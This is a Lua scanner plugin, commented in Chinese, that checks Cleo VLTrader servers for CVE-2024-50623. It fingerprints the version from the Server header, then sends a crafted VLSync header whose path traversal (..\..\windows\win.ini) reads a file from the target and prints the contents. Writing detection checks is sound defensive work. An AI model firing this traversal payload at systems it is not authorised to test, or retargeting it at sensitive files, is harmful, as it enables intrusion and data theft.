-- CVE-2024-50623 漏洞检测函数
function check_CVE_2024_50623(target)
    print("[Cleo] Starting CVE-2024-50623 check for", target)
    
    -- 第一步: 获取版本信息
    local resp = http.get(target .. "/Synchronization", {
        timeout = 10,
        headers = {
            ["Host"] = target:match("https?://([^/]+)"),
            ["User-Agent"] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
        }
    })
    
    if not resp then
        print("[Cleo] No response received from version check")
        return nil
    end
    
    -- 从响应头中提取版本信息
    local version = nil
    if resp.headers["Server"] then
        print("[Cleo] Server header:", resp.headers["Server"])
        local server = resp.headers["Server"]
        version = string.match(server, "VLTrader/([^%s]+)")
        if version then
            print("[Cleo] Found version:", version)
        end
    end
    
    if not version then
        print("[Cleo] Could not determine version")
        return nil
    end
    
    -- 第二步: 尝试读取文件
    local read_headers = {
        ["VLSync"] = string.format(
            "Retrieve;l=Ab1234-RQ0258;n=VLTrader;v=%s;a=1337;po=1337;s=True;b=False;pp=1337;path=..\\..\\windows\\win.ini",
            version
        )
    }
    
    print("[Cleo] Attempting to read file with headers:", read_headers["VLSync"])
    
    local read_resp = http.get(target .. "/Synchronization", {
        timeout = 10,
        headers = read_headers
    })
    
    if read_resp then
        print("[Cleo] Response status:", read_resp.status)
        print("[Cleo] ===== Response Headers =====")
        for k, v in pairs(read_resp.headers) do
            print(string.format("[Cleo] %s: %s", k, v))
        end
        print("[Cleo] ===== Response Body =====")
        print(read_resp.body)
        print("[Cleo] ========================")
        
        -- 检查是否成功读取文件
        if read_resp.status == 200 and string.match(read_resp.body, "fonts") then
            print("[Cleo] File read vulnerability confirmed!")
            return {
                CVEID = "CVE-2024-50623",
                Severity = "critical",
                Type = "lfi",
                Extra = {
                    ["Description"] = "Cleo VLTrader Unrestricted file read vulnerability",
                    ["Version"] = version,
                    ["Proof"] = string.sub(read_resp.body, 1, 200)
                }
            }
        end
    else
        print("[Cleo] Failed to read file")
    end
    
    return nil
end

function Analyze(info)
    if not info or not info.IP or not info.Port then
        print("[Cleo] Invalid ServiceInfo: missing IP or Port")
        return info
    end

    print("[Cleo] Starting analysis for", info.IP..":", info.Port)
    
    -- 构造目标URL
    local target = string.format("http://%s:%d", info.IP, info.Port)
    print("[Cleo] Target URL:", target)
    
    -- 检查各个CVE
    local vulns = {}
    
    -- 检查 CVE-2024-50623
    local result = check_CVE_2024_50623(target)
    if result then
        table.insert(vulns, result)
        print("[Cleo] Added vulnerability:", result.CVEID)
    end
    
    -- 如果发现漏洞，添加到结果中
    if #vulns > 0 then
        info.Vulnerabilities = vulns
        print("[Cleo] Total vulnerabilities found:", #vulns)
    else
        print("[Cleo] No vulnerabilities found")
    end

    return info
end 